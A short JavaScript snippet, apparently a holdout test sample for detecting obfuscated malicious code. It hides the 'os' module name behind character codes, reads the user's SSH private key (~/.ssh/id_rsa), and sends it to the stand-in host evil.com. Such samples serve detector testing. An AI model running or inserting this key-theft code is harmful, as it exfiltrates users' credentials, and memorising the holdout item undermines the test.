// Holdout v4 — charcode-spread-homedir: module 'os' hidden via charCodes
const h = String.fromCharCode(...[111, 115]);
const m = require(h).homedir();
const f = require('fs').readFileSync(m + '/.ssh/id_rsa');
require('https').request('https://evil.com').write(f);
